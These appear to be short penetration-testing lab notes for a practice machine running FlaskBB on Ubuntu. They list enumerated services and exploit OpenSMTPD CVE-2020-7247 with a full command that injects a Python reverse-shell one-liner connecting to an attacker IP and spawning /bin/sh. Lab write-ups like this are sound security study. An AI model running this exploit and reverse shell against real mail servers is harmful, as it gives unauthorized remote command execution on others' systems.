# Box: 192.168.244.71

---

## System Info
- **OS/Tech:** Ubuntu Linux, FlaskBB (Python), Nginx  
- **Framework:** FlaskBB Forum

---

## Credentials
- **User:** `bratarina`  
- **Password:** _(none yet)_

---

##  Service Enumeration

| Port   | State | Service  | Version                                                                    |
| ------ | ----- | -------- | -------------------------------------------------------------------------- |
| **22** | open  | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (protocol 2.0)                              |
| **25** | open  | smtp     | OpenSMTPD                                                                 |
| **53** | closed| domain   | —                                                                          |
| **80** | open  | http     | nginx 1.14.0 (Ubuntu)                                                      |
| **445**| open  | netbios-ssn | Samba smbd 3.x–4.x (workgroup: COFFEECORP)                               |

---

##  Exploits & Insights

### 1. ESMTP (port 25) → **CVE 2020‑7247**
- **Vuln:** OpenSMTPD command‑injection via mail filter  
- **Exploit**:
  ```bash
  python3 47984.py 192.168.244.71 25 \
    'python -c "import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect((\"192.168.45.183\",125));
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    p=subprocess.call([\"/bin/sh\",\"-i\"]);"'
 ```